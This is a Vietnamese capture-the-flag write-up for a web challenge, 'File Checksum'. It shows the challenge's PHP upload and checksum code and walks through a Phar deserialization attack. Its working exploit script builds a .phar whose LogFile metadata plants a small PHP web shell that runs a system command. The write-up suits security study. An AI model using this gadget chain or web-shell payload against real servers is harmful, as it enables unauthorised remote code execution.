---
title: File Checksum
id: File_Checksum
author: MEME
description: Read the /flag.txt
points: 10
difficulty: Very easy
date: 17-1-2026
share_link: https://share.note.sx/nbherb0y#kT+08G58pQZEWkdng6evRt34b0yw55z8uh0RKdmybaE
share_updated: 2026-01-19T18:03:07+07:00
---
# TL;DR

Khai thác lỗ hổng Phar deserialization để up shell lên server -> RCE 

---
# Initial Reconnaissance

Khi vừa mở chall lên ta có một giao diện up file

![[Pasted image 20260117062905.png]]

Up bừa một file bất kì lên thì ta có giao diện như này

![[Pasted image 20260117063017.png]]


Mở source code lên để phân tích cách chall xử lý file upload:

**upload.php**:

```php
<?php
$uploadDir = 'uploads/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES['fil e'])&& $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $fileName = basename($_FILES['file']['name']);
    $filePath = $uploadDir . uniqid() . "_" . $fileName;

    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
    $disallowedExtensions = ['php', 'php5', 'php6', 'php7', 'php8'];

    if (in_array($fileExtension, $disallowedExtensions)) {
        echo "File type not allowed!";
        exit;
    }

    if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
        echo "File uploaded successfully! <br>";
        echo "Link to checksum: <a href='checksum.php?file=" . urlencode($filePath) . "'>checksum.php?file=" . htmlspecialchars($filePath) . "</a>";
    } else {
        echo "File upload failed!";
    }
} else {
    echo "No file uploaded or there was an upload error.";
}
?>
```

Tóm tắt lại cách xử lý của server như sau:
- Kiểm tra xem đuôi file được upload có phải là một trong các định dạng php không và chặn nếu phát hiện.
- Nếu file hợp lệ thì thêm một chuỗi ngẫu nhiên vào trước tên file và lưu vào `uploads/`

-> Điều này làm loại hai hướng tiếp cận là up file php trực tiếp và up file .htaccess

Tiếp tục mò vào `checksum.php`

**checksum.php**:

```php
<?php
include 'logging.php';

if (isset($_GET['file'])) {
    $filePath = $_GET['file'];
    if (file_exists($filePath)) {
        $md5Checksum = md5_file($filePath);
        echo "MD5 Checksum of file: " . htmlspecialchars($filePath) . "<br>";
        echo "MD5: " . $md5Checksum;
        $log = new LogFile();
        $log->filename = 'checksum.log';
        $log->fcontents = "File: " . $filePath . " | MD5: " . $md5Checksum;
    } else {
        echo "File does not exist.";
    }
} else {
    echo "No file specified.";
}
?>

```

File này đơn giản là lấy nội dung của file, hiện thị hash md5 của nó và lưu lại log

Logic xử lý log nằm ở `logging.php`

**logging.php**:

```php
<?php
class LogFile {
    public $filename;
    public $fcontents;

    public function writeToFile() {
        if (!empty($this->filename) && !empty($this->fcontents)) {
            file_put_contents($this->filename, $this->fcontents . PHP_EOL, FILE_APPEND);
        }
    }

    public function __destruct() {
        $this->writeToFile();
    }
}
?>
```

Khi một object của class này hết phiên thì sẽ tạo một thao tác lưu file với tên là `filename` và nội dung là `fcontents` vào thư mục của server

---
# Exploit and get flag

```php
$disallowedExtensions = ['php', 'php5', 'php6', 'php7', 'php8'];
```

Đầu tiên mình nhìn vào các đuôi file bị chặn và tự hỏi xem còn đuôi file nào khác được chấp nhận chạy như một file php bình thường không

![[Pasted image 20260117064623.png]]

Thử một loạt các đuôi file thì mình đều không nhận được kết quả nào khả quan

Thế nhưng sau khi tìm hiểu thêm thì mình nhận ra là mình sử dụng đuôi `.phar` sai cách

Cụ thể thì để khai thác được thì mình phải dùng một số tính chất đặc biệt của file `.phar`, mọi người có thể tham khảo ở link sau:
[Kỹ thuật khai thác lỗ hổng Phar Deserialization](https://sec.vnpt.vn/2019/08/ky-thuat-khai-thac-lo-hong-phar-deserialization)

Dưới đây là toàn bộ những lý do mà mình có thể khai thác lỗ hổng này:

- Phiên bản php mà chall đang dùng là 7.2.34 (chall public `info.php` ở `/info.php`) < 8.0 nên vẫn chưa bị patch

- Có một hàm thao tác với file (`file_exists` trong `checksum.php`) và ta hoàn toàn có thể tùy chỉnh đối số của hàm để gọi wrapper `phar://` giúp deserialize file `.phar` mà mình upload

- Trong `checksum.php` lại import class `LogFile` trong `logging.php` mà trong đó có magic method `__destruct` gọi hàm với chức năng tạo file với tên và nội dung tùy ý

> Trong file `checksum.php` vẫn còn một hàm nhận wrapper `phar://` nữa là `md5_file` nhưng do cơ chế cache của PHP mà cụ thể là vì khi file phar được deserialize bởi `file_exist` thì kết quả của wrapper đó đã được lưu trong cache, hàm `md5_file` khi gặp phải một request y hệt thì nó sẽ lấy luôn kết quả đã được cache đó mà không deserialize ra nữa
> Tóm lại là chỉ có một object của class `LogFile` chứa shell duy nhất được tạo ra bởi hàm `file_exists` :vv

Việc còn lại chỉ là tạo một file `.phar` chứa class `LogFile` được chỉnh sửa để tạo shell thôi

Dưới đây là script mình dùng để tạo file `.phar`:

**script.php**:

```php
<?php
class LogFile {
    public $filename;
    public $fcontents;

    public function writeToFile() {
        if (!empty($this->filename) && !empty($this->fcontents)) {
            file_put_contents($this->filename, $this->fcontents . PHP_EOL, FILE_APPEND);
        }
    }

    public function __destruct() {
        $this->writeToFile();
    }
}

$phar = new Phar("exploit.phar");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("dummy.txt", "1234");

$object = new LogFile();
$object->filename = "exploit.php";
$object->fcontents = '<?php system("cat /flag.txt") ?>';
$phar->setMetadata($object);
?>
```

Vì description đã nói rõ flag nằm ở `/flag.txt` nên mình tạo `exploit.php` đọc trực tiếp luôn

Chạy `php script.php` để tạo `exploit.phar`

Sau đấy mình chỉ cần up và gọi file vừa được up với wrapper `phar://` là sẽ tạo được shell

![[Pasted image 20260117071711.png]]

![[Pasted image 20260117071852.png]]

Cuối cùng là gọi `exploit.php` là sẽ có flag

![[Pasted image 20260117072001.png]]

**Flag**: `CHH{Ph4r_D3Ser1alizAtiOn_cd1cb94c6e2480424c2783fb550a0f7b}`